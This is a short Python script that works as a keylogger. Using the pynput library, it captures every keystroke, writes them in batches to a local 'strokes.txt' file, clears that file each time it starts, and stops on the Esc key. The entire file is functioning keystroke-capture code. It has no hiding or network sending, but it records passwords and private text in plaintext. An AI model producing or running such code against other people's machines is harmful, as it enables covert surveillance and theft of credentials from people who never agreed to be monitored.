from pynput import keyboard

# list of chars entered by the user
list = []
number_of_chars = 0
# if entered chars go above MAX LENGTH they will be written inside a file
MAX_LENGTH = 300

def on_press(key):
    global number_of_chars
    global list
    
    list.append(key)
    number_of_chars+=1


    if number_of_chars>=MAX_LENGTH:
        write_in_file()
        list.clear()
        number_of_chars = 0

def on_release(key):
    if key == keyboard.Key.esc:
        # if the user exist write all the contents inside the file
        write_in_file()
        return False

def write_in_file():
    file = open("strokes.txt","a")
    for k in list:
        file.writelines("{}\n".format(str(k)))
    file.close()



# erases contents of the file when the program is runned
open("strokes.txt","w").close()

with keyboard.Listener(on_press = on_press,on_release=on_release) as listener:
    listener.join()